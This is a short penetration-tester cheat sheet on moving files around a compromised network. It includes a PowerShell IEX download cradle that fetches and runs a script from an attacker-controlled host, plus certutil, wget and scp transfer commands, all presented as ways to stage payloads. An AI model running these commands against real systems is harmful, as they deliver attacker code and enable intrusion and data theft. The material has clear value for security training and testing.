**Overview:**
 - Attackers frequently exploit legitimate services (like SSH or FTP) to move files quietly within a compromised network.
 - File transfers look simple but are powerful: misconfigured SSH, FTP, NFS or MS‑SQL services let attackers stage payloads, exfiltrate secrets, or pivot to the OS with minimal fuss.
---
## Web Servers

```
IEX (New-Object Net.WebClient).DownloadString('http://<lhost>/<file>')
```

Downloads a file from a web server using PowerShell. Windows host.

```
certutil.exe -verifyctl -split -f http://<lhost>/<file>
```

Downloads a file using Certutil (`cmd.exe`). Windows host.

```
wget http://<lhost>/<file> -O /tmp/<file>
```

Downloads a file using wget. Linux host.

---
## SCP

```
scp <user>@<target>:/tmp/<file> C:\Temp\<file>
```

Downloads a file using SCP. Windows host.